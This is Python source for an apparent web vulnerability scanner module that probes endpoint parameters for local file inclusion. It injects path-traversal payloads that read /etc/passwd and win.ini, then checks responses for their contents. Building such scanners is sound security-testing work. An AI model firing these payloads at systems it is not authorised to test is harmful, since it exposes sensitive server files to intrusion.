import requests
import copy
import os

class LFIScanner:
    def __init__(self, auth_header=None):
        self.headers = {}
        if auth_header:
            parts = auth_header.split(':', 1)
            if len(parts) == 2:
                self.headers[parts[0].strip()] = parts[1].strip()

        # Load payloads từ file text
        self.payloads = []
        payload_file = os.path.join(os.path.dirname(__file__), 'payloads', 'lfi.txt')
        if os.path.exists(payload_file):
            with open(payload_file, 'r', encoding='utf-8') as f:
                self.payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not self.payloads:
            self.payloads = [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd"
            ]

    def scan(self, endpoint):
        vulnerabilities = []
        url = endpoint.get("url")
        method = endpoint.get("method", "GET").upper()
        params = endpoint.get("params", {})
        
        if not params:
            return vulnerabilities

        for param_name in params.keys():
            for payload in self.payloads:
                test_params = copy.deepcopy(params)
                test_params[param_name] = payload
                
                print(f"Testing LFI on: {url} | Param: {param_name}")
                try:
                    if method == "POST":
                        response = requests.post(url, data=test_params, headers=self.headers, timeout=5)
                    else:
                        response = requests.get(url, params=test_params, headers=self.headers, timeout=5)
                        
                    response_text = response.text.lower()
                    if "root:x:0:0" in response_text or "[extensions]" in response_text:
                        vulnerabilities.append({
                            "url": url,
                            "type": "LFI",
                            "param": param_name,
                            "payload": payload,
                            "severity": "High",
                            "evidence": "Sensitive file content (like /etc/passwd or win.ini) found in response."
                        })
                        break
                except Exception as e:
                    print(f"Request failed: {e}")
                    
        return vulnerabilities
